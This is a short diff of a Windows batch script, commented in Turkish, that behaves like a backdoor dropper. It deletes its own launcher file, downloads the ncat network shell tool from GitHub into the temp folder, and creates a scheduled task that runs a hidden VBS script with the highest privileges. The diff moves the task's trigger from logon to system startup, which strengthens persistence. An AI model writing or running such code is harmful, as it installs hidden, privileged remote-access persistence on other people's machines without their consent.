@@ -12,7 +12,7 @@ if %taskExists% neq 0 (
     del /f /q "asd.bat"
     cd /d %temp%
     curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
-    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onlogon /f /rl HIGHEST
+    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
 
     REM rb.vbs sadece marker yoksa çalışsın
     if not exist "%marker%" (
@@ -24,7 +24,8 @@ if %taskExists% neq 0 (
     del /f /q "asd.bat"
     cd /d %temp%
     curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
-    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onlogon /f /rl HIGHEST
+    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
+    
 )
 
 endlocal
